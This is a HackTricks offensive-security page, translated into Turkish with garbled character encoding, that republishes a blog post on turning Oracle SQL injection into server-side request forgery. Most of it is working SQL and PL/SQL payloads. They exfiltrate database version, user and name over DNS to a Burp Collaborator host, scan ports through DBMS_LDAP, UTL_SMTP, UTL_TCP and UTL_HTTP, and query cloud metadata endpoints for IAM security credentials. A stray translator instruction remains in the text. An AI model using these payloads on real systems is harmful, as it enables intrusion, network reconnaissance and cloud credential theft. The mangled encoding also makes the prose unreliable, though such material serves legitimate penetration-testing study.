# Oracle injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Bu gÃ¶nderiyi [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/) adresinden silinmiÅŸ gÃ¶nderinin wayback machine kopyasÄ± olarak sunun.**

## SSRF

Oracle kullanarak Out of Band HTTP ve DNS istekleri yapmak iyi belgelenmiÅŸtir, ancak bu, enjeksiyonlarda SQL verilerini dÄ±ÅŸarÄ± sÄ±zdÄ±rmanÄ±n bir yolu olarak kullanÄ±lmaktadÄ±r. Bu teknikleri/fonksiyonlarÄ± her zaman diÄŸer SSRF/XSPA'larÄ± yapmak iÃ§in deÄŸiÅŸtirebiliriz.

Oracle'Ä± kurmak gerÃ§ekten acÄ± verici olabilir, Ã¶zellikle de komutlarÄ± denemek iÃ§in hÄ±zlÄ± bir Ã¶rnek kurmak istiyorsanÄ±z. [Appsecco](https://appsecco.com) ÅŸirketindeki arkadaÅŸÄ±m ve meslektaÅŸÄ±m [Abhisek Datta](https://github.com/abhisek), bana bir t2.large AWS Ubuntu makinesinde ve Docker'da bir Ã¶rnek kurmamÄ± saÄŸlayan [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c) adresini gÃ¶sterdi.

Docker komutunu `--network="host"` bayraÄŸÄ± ile Ã§alÄ±ÅŸtÄ±rdÄ±m, bÃ¶ylece bu blog yazÄ±sÄ±nÄ±n sÃ¼resince Oracle'Ä± tam aÄŸ eriÅŸimi ile yerel bir kurulum olarak taklit edebildim.
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### URL veya Hostname/Port NumarasÄ± belirtimini destekleyen Oracle paketleri <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

Bir host ve port belirtimini destekleyen paketler ve fonksiyonlar bulmak iÃ§in, [Oracle Database Online Documentation](https://docs.oracle.com/database/121/index.html) Ã¼zerinde bir Google aramasÄ± yaptÄ±m. Ã–zellikle,
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
Arama aÅŸaÄŸÄ±daki sonuÃ§larÄ± dÃ¶ndÃ¼rdÃ¼ (hepsi dÄ±ÅŸa aÄŸ baÄŸlantÄ±sÄ± gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±lamaz)

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

Bu kaba arama, `DBMS_LDAP` gibi paketleri aÃ§Ä±kÃ§a atlÄ±yor (bir ana bilgisayar adÄ± ve port numarasÄ± geÃ§iÅŸine izin verir) Ã§Ã¼nkÃ¼ [belgelendirme sayfasÄ±](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360) sizi [farklÄ± bir konuma](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360) yÃ¶nlendiriyor. Bu nedenle, dÄ±ÅŸa istekler yapmak iÃ§in kÃ¶tÃ¼ye kullanÄ±labilecek baÅŸka Oracle paketleri olabilir, bunlarÄ± atlamÄ±ÅŸ olabilirim.

Her durumda, keÅŸfettiÄŸimiz ve yukarÄ±da listelediÄŸimiz bazÄ± paketlere bir gÃ¶z atalÄ±m.

**DBMS\_LDAP.INIT**

`DBMS_LDAP` paketi, LDAP sunucularÄ±ndan veri eriÅŸimine olanak tanÄ±r. `init()` fonksiyonu, bir LDAP sunucusuyla bir oturum baÅŸlatÄ±r ve bir ana bilgisayar adÄ± ve port numarasÄ±nÄ± argÃ¼man olarak alÄ±r.

Bu fonksiyon, aÅŸaÄŸÄ±daki gibi DNS Ã¼zerinden veri sÄ±zdÄ±rma gÃ¶sterimi iÃ§in daha Ã¶nce belgelenmiÅŸtir.
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
Ancak, fonksiyonun bir ana bilgisayar adÄ± ve bir port numarasÄ± argÃ¼manlarÄ± kabul ettiÄŸini gÃ¶z Ã¶nÃ¼nde bulundurursak, bunu bir port tarayÄ±cÄ± gibi Ã§alÄ±ÅŸmak iÃ§in de kullanabilirsiniz.

Ä°ÅŸte birkaÃ§ Ã¶rnek
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
A `ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.`, bir oturum deÄŸerinin portun aÃ§Ä±k olduÄŸunu gÃ¶sterirken, portun kapalÄ± olduÄŸunu gÃ¶sterir.

**UTL\_SMTP**

`UTL_SMTP` paketi, SMTP Ã¼zerinden e-posta gÃ¶ndermek iÃ§in tasarlanmÄ±ÅŸtÄ±r. [Oracle belgeleri sitesinde saÄŸlanan Ã¶rnek, bu paketi kullanarak nasÄ±l e-posta gÃ¶nderebileceÄŸinizi gÃ¶stermektedir](https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478). Ancak bizim iÃ§in ilginÃ§ olan, bir ana bilgisayar ve port belirtme yeteneÄŸidir.

AÅŸaÄŸÄ±da, 2 saniyelik bir zaman aÅŸÄ±mÄ± ile `UTL_SMTP.OPEN_CONNECTION` fonksiyonu ile basit bir Ã¶rnek gÃ¶sterilmektedir.
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
`ORA-29276: transfer timeout` aÃ§Ä±k bir portun olduÄŸunu ancak SMTP baÄŸlantÄ±sÄ±nÄ±n kurulmadÄ±ÄŸÄ±nÄ± gÃ¶sterirken, `ORA-29278: SMTP transient error: 421 Service not available` portun kapalÄ± olduÄŸunu gÃ¶sterir.

**UTL\_TCP**

`UTL_TCP` paketi ve prosedÃ¼rleri ile fonksiyonlarÄ±, [hizmetlerle TCP/IP tabanlÄ± iletiÅŸim saÄŸlar](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190). Belirli bir hizmet iÃ§in programlandÄ±ÄŸÄ±nda, bu paket aÄŸa giriÅŸ yapmak veya tÃ¼m Sunucu TarafÄ± Ä°steklerini gerÃ§ekleÅŸtirmek iÃ§in kolayca bir yol haline gelebilir, Ã§Ã¼nkÃ¼ bir TCP/IP baÄŸlantÄ±sÄ±nÄ±n tÃ¼m yÃ¶nleri kontrol edilebilir.

Oracle dokÃ¼mantasyon sitesindeki [Ã¶rnek, bu paketi kullanarak bir web sayfasÄ±nÄ± almak iÃ§in ham bir TCP baÄŸlantÄ±sÄ± nasÄ±l yapÄ±lacaÄŸÄ±nÄ± gÃ¶stermektedir](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190). Bunu biraz daha basitleÅŸtirip, Ã¶rneÄŸin, metadata Ã¶rneÄŸine veya keyfi bir TCP/IP hizmetine istek yapmak iÃ§in kullanabiliriz.
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
Ä°lginÃ§ bir ÅŸekilde, ham TCP istekleri oluÅŸturma yeteneÄŸi sayesinde, bu paket tÃ¼m bulut saÄŸlayÄ±cÄ±larÄ±nÄ±n Instance meta-veri hizmetini sorgulamak iÃ§in de kullanÄ±labilir, Ã§Ã¼nkÃ¼ yÃ¶ntem tÃ¼rÃ¼ ve ek baÅŸlÄ±klar TCP isteÄŸi iÃ§inde iletilebilir.

**UTL\_HTTP ve Web Ä°stekleri**

Belki de her Out of Band Oracle SQL Injection eÄŸitiminde en yaygÄ±n ve geniÅŸ bir ÅŸekilde belgelenmiÅŸ teknik [`UTL_HTTP` paketi](https://docs.oracle.com/database/121/ARPLS/u_http.htm#ARPLS070) dir. Bu paket, belgelerde ÅŸu ÅŸekilde tanÄ±mlanmÄ±ÅŸtÄ±r - `UTL_HTTP paketi, SQL ve PL/SQL'den Hypertext Transfer Protocol (HTTP) Ã§aÄŸrÄ±larÄ± yapar. HTTP Ã¼zerinden Ä°nternetteki verilere eriÅŸmek iÃ§in kullanabilirsiniz.`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
AyrÄ±ca, bunu ÅŸu tÃ¼r sorgularla bazÄ± temel port taramalarÄ± gerÃ§ekleÅŸtirmek iÃ§in de kullanabilirsiniz.
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
`ORA-12541: TNS:no listener` veya `TNS:operation timed out` hatasÄ±, TCP portunun kapalÄ± olduÄŸunun bir iÅŸaretiyken, `ORA-29263: HTTP protocol error` veya veri, portun aÃ§Ä±k olduÄŸunun bir iÅŸareti.

GeÃ§miÅŸte Ã§eÅŸitli baÅŸarÄ±larla kullandÄ±ÄŸÄ±m bir diÄŸer paket, bir URL ile etkileÅŸimde bulunmanÄ±za ve HTTP protokolÃ¼nÃ¼ desteklemenize olanak tanÄ±yan [`HTTPURITYPE` Oracle soyut tipinin `GETCLOB()` yÃ¶ntemi](https://docs.oracle.com/database/121/ARPLS/t_dburi.htm#ARPLS71705)'dir. `GETCLOB()` yÃ¶ntemi, bir URL'den GET yanÄ±tÄ±nÄ± [CLOB veri tipi olarak](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html) almak iÃ§in kullanÄ±lÄ±r. [select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
